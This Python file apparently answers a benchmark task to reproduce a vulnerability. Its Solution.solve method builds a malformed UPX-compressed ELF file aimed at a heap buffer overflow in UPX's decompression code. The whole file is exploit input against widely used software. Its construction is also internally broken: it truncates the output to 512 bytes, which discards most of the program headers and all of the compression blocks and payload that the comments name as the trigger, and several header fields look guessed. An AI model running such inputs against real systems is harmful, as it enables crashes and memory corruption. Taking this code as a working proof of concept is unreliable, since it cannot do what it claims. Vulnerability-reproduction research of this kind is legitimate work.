import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed UPX-compressed ELF file that triggers the heap buffer overflow
        # Based on OSS-Fuzz issue 383200048
        
        # UPX magic header
        data = b'UPX!'
        
        # UPX version
        data += struct.pack('<H', 0x0301)  # Version 3.01
        
        # Format (0 = i386, 3 = lx_elf)
        data += b'\x03'
        
        # Compression method (2 = lzma)
        data += b'\x02'
        
        # Compression level
        data += b'\x01'
        
        # Checksum (ignored for PoC)
        data += b'\x00\x00\x00\x00'
        
        # Filters
        data += b'\x00\x00'
        
        # n_mru, extra_len
        data += b'\x00\x00'
        
        # reserved[2]
        data += b'\x00\x00'
        
        # xct_off (exception handler table offset) - set to trigger overflow
        # This controls the lowmem[0, +xct_off) region
        data += struct.pack('<I', 0x10000000)  # Large value to trigger overflow
        
        # head_len (header length)
        data += struct.pack('<I', 0x34)
        
        # ELF header start
        # e_ident
        data += b'\x7fELF'  # ELF magic
        data += b'\x01'     # 32-bit
        data += b'\x01'     # Little endian
        data += b'\x01'     # Version
        data += b'\x00'     # OS ABI
        data += b'\x00'     # ABI Version
        data += b'\x00\x00\x00\x00\x00\x00\x00'  # Padding
        
        # e_type (ET_EXEC = 2)
        data += struct.pack('<H', 2)
        
        # e_machine (EM_386 = 3)
        data += struct.pack('<H', 3)
        
        # e_version
        data += struct.pack('<I', 1)
        
        # e_entry (entry point) - set to 0
        data += struct.pack('<I', 0)
        
        # e_phoff (program header offset) - point to after ELF header
        data += struct.pack('<I', 0x34)
        
        # e_shoff (section header offset) - 0 (no section headers)
        data += struct.pack('<I', 0)
        
        # e_flags
        data += struct.pack('<I', 0)
        
        # e_ehsize (ELF header size)
        data += struct.pack('<H', 0x34)
        
        # e_phentsize (program header entry size)
        data += struct.pack('<H', 0x20)
        
        # e_phnum (number of program headers) - create multiple to trigger ph.method issue
        data += struct.pack('<H', 0x40)  # 64 headers
        
        # e_shentsize (section header entry size)
        data += struct.pack('<H', 0)
        
        # e_shnum (number of section headers)
        data += struct.pack('<H', 0)
        
        # e_shstrndx (section header string table index)
        data += struct.pack('<H', 0)
        
        # Program headers - create malformed ones that trigger the vulnerability
        # The vulnerability involves improper resetting of ph.method on each b_info.b_method
        
        for i in range(0x40):
            # p_type (PT_LOAD = 1)
            data += struct.pack('<I', 1)
            
            # p_offset
            data += struct.pack('<I', 0)
            
            # p_vaddr
            data += struct.pack('<I', 0x08048000)
            
            # p_paddr
            data += struct.pack('<I', 0x08048000)
            
            # p_filesz - large value to trigger overflow
            data += struct.pack('<I', 0x10000000)
            
            # p_memsz - different from filesz to trigger issues
            data += struct.pack('<I', 0x20000000)
            
            # p_flags (PF_R | PF_W | PF_X = 7)
            data += struct.pack('<I', 7)
            
            # p_align
            data += struct.pack('<I', 0x1000)
        
        # Now add compressed blocks (b_info structures)
        # The vulnerability occurs during decompression when ph.method is not properly reset
        
        # First b_info block
        # sz_unc (uncompressed size) - small
        data += struct.pack('<I', 0x100)
        
        # sz_cpr (compressed size) - even smaller
        data += struct.pack('<I', 0x50)
        
        # b_method (compression method) - this should trigger the ph.method reset bug
        # Using value that causes the improper reset
        data += struct.pack('<I', 0xFFFFFFFF)
        
        # Second b_info block with different method to trigger the bug
        # when ph.method from previous block isn't reset
        data += struct.pack('<I', 0x200)  # sz_unc
        data += struct.pack('<I', 0x100)  # sz_cpr
        data += struct.pack('<I', 0x02)   # b_method (different from previous)
        
        # Compressed data that will overflow when decompressed
        # Create pattern that will trigger heap corruption
        compressed_data = b'A' * 0x50  # First block's compressed data
        compressed_data += b'B' * 0x100  # Second block's compressed data
        
        # Add pattern that will trigger specific code paths in un_DT_INIT()
        # This targets the unsafe lowmem usage
        compressed_data += b'\x00' * 16  # Null bytes
        compressed_data += b'\xff' * 16  # 0xFF bytes
        compressed_data += struct.pack('<I', 0x08048000) * 4  # Addresses
        
        data += compressed_data
        
        # Pad to exactly 512 bytes (ground-truth length)
        current_len = len(data)
        if current_len < 512:
            data += b'\x00' * (512 - current_len)
        elif current_len > 512:
            data = data[:512]
        
        return data
